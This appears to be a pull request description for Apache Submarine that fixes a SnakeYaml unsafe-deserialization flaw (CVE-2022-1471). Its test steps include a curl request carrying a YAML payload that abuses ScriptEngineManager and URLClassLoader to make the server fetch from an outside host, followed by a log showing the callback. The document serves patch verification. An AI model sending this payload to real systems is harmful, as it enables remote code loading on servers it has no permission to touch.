#### Description

Use SnakeYaml's SafeConstructor to replace default Yaml no arguments constructor to void unsafe deserialization.

Link url: <https://nvd.nist.gov/vuln/detail/CVE-2022-1471>

Test steps:

1. start a server with **python3 -m http.server 8080**
2. start submarine
3. test submarine with command
   ```

   curl --location 'http://127.0.0.1:32080/api/v1/serve/' \
   --header 'Content-Type: application/yaml' \
   --data '!!org.apache.submarine.server.api.model.ServeSpec: modelName: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://localhost:8080"]]]]'

   ```
4. we can see python server receive url like this:
   ```

   Serving HTTP on :: port 8080 (http://[::]:8080/) ...
   ::ffff:127.0.0.1 - - [05/Mar/2023 16:12:01] "GET / HTTP/1.1" 200 -
